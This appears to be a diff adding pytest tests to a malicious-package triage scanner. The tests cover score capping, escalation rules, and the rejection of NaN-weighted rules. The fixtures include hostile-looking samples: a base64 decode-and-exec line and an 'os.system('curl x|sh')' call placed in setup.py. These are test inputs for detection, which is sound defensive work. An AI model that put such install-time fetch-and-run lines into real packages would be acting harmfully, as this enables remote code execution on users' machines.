@@ -125,3 +125,47 @@ def test_deep_pad_does_not_mask_a_real_decode_exec_loader():
     r = triage(d, Config(), RULES)
     assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)
     assert r.escalate
+
+
+def _many(n, lines):
+    return Diff("p", "1.1", False, [FileDiff(f"pkg/m{i}.py", "modified",
+        [Hunk((0, 0), (0, len(lines)), lines, [])], "\n".join(lines)) for i in range(n)], [])
+
+
+def test_primitives_is_capped_below_threshold():
+    [prim] = [r for r in RULES if r.id == "primitives"]
+    assert prim.max_total == 35 and prim.max_total < Config().threshold_t
+
+
+def test_primitives_only_large_diff_does_not_escalate():
+    r = triage(_many(30, ["import subprocess", "subprocess.run(['ls'])"]), Config(), RULES)
+    assert {fr.rule for fr in r.fired_rules} == {"primitives"}
+    assert len(r.fired_rules) == 30 and r.score <= 35 and not r.escalate
+
+
+def test_primitives_plus_combo_still_escalates():
+    d = _many(30, ["import subprocess", "subprocess.run(['ls'])"])
+    d.changed.append(_code("pkg/x.py", ["import base64", "exec(base64.b64decode(B))"]).changed[0])
+    r = triage(d, Config(), RULES)
+    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules) and r.escalate
+
+
+def test_primitives_plus_autoexec_still_escalates():
+    d = _many(30, ["import subprocess", "subprocess.run(['ls'])"])
+    d.changed.append(_code("setup.py", ["import os", "os.system('curl x|sh')"]).changed[0])
+    r = triage(d, Config(), RULES)
+    assert any(fr.rule == "autoexec-location" for fr in r.fired_rules) and r.escalate
+
+
+def test_nan_weight_catch_all_rule_is_dropped_so_escalation_survives(tmp_path):
+    # A community catch-all with weight .nan would make every score NaN (NaN >= 40 is False) and fail
+    # detection open. It must be dropped at load, so a known-escalating diff still escalates.
+    import shutil
+    for p in Path("rules/community").glob("*.yaml"):
+        shutil.copy(p, tmp_path / p.name)
+    (tmp_path / "zz-nan.yaml").write_text(
+        "- id: nan-catch-all\n  applies_to: code\n  weight: .nan\n"
+        "  match: {not: {syntax_error: true}}\n")
+    rules = load_rules(tmp_path)
+    assert "nan-catch-all" not in {r.id for r in rules} and len(rules) == len(RULES)
+    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), rules).escalate
